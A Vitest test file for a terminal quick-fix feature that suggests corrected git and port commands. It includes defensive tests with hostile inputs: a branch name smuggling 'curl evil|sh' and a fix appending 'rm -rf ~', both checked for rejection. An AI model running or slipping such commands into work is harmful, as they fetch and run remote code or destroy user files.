import { describe, expect, it } from "vitest";
import { findQuickFix, safeFix, type QuickFixRule } from "./quick-fix";
import { DEFAULT_QUICK_FIX_RULES, freePort, gitPushSetUpstream, gitSimilar, gitTwoDashes } from "./quick-fix-rules";

const input = (command: string, exitCode: number | null, output: string) => ({
	command,
	exitCode,
	output: () => output.split("\n"),
});

const PUSH_NO_UPSTREAM = [
	"fatal: The current branch feature/login has no upstream branch.",
	"To push the current branch and set the remote as upstream, use",
	"",
	"    git push --set-upstream origin feature/login",
	"",
	"To have this happen automatically for branches without a tracking",
	"upstream, see 'push.autoSetupRemote' in 'git help config'.",
	"",
].join("\n");

describe("findQuickFix", () => {
	it("offers the set-upstream push for a push with no upstream", () => {
		expect(findQuickFix([gitPushSetUpstream], input("git push", 128, PUSH_NO_UPSTREAM))).toEqual({
			ruleId: "git-push-set-upstream",
			command: "git push --set-upstream origin feature/login",
		});
	});

	it("offers nothing when the command succeeded", () => {
		expect(findQuickFix([gitPushSetUpstream], input("git push", 0, PUSH_NO_UPSTREAM))).toBeNull();
	});

	it("offers nothing when the exit status is unknown", () => {
		expect(findQuickFix([gitPushSetUpstream], input("git push", null, PUSH_NO_UPSTREAM))).toBeNull();
	});

	it("offers nothing when the line is above the bottom window", () => {
		const padded = `${PUSH_NO_UPSTREAM}\n${Array.from({ length: 20 }, (_, index) => `line ${index}`).join("\n")}`;
		expect(findQuickFix([gitPushSetUpstream], input("git push", 1, padded))).toBeNull();
	});

	it("offers the similar git subcommand", () => {
		const output = "git: 'stauts' is not a git command. See 'git --help'.\n\nThe most similar command is\n\tstatus";
		expect(findQuickFix([gitSimilar], input("git stauts -s", 1, output))?.command).toBe("git status -s");
	});

	it("offers the two-dash option", () => {
		const output = "error: did you mean `--amend` (with two dashes)?";
		expect(findQuickFix([gitTwoDashes], input("git commit -amend", 129, output))?.command).toBe("git commit --amend");
	});

	it("offers to free a port that is in use", () => {
		const output = "Error: listen EADDRINUSE: address already in use :::3000\n    at Server.setupListenHandle";
		expect(findQuickFix([freePort], input("npm run dev", 1, output))?.command).toBe(
			"kill $(lsof -t -iTCP:3000 -sTCP:LISTEN)",
		);
	});

	it("reads the output only for a rule whose command line and exit match", () => {
		let reads = 0;
		const result = findQuickFix(DEFAULT_QUICK_FIX_RULES, {
			command: "ls",
			exitCode: 0,
			output: () => {
				reads += 1;
				return [];
			},
		});
		expect(result).toBeNull();
		expect(reads).toBe(0);
	});

	it("never offers a git option as the upstream branch", () => {
		const forged = ["remote: git push --set-upstream origin --mirror", "error: failed to push some refs"].join("\n");
		expect(findQuickFix([gitPushSetUpstream], input("git push", 1, forged))).toBeNull();
	});

	it("drops a branch name a program could use to smuggle a second command", () => {
		const forged = "    git push --set-upstream origin x;curl${IFS}evil|sh";
		expect(findQuickFix([gitPushSetUpstream], input("git push", 1, forged))).toBeNull();
	});

	it("drops a fix with a control character or a newline, or one equal to the command", () => {
		const rule: QuickFixRule = { id: "echo", commandLine: /.+/, exit: "any", fix: ({ command }) => `${command}\nrm -rf ~` };
		expect(findQuickFix([rule], input("ls", 1, ""))).toBeNull();
		expect(safeFix("ls\x1b[2J", "x")).toBeNull();
		expect(safeFix(" ls ", "ls")).toBeNull();
		expect(safeFix("ls -la", "ls")).toBe("ls -la");
	});

	it("takes the first rule that produces a fix", () => {
		const first: QuickFixRule = { id: "first", commandLine: /make/, exit: "error", fix: () => null };
		const second: QuickFixRule = { id: "second", commandLine: /make/, exit: "error", fix: () => "make clean" };
		expect(findQuickFix([first, second], input("make", 2, ""))?.ruleId).toBe("second");
	});
});
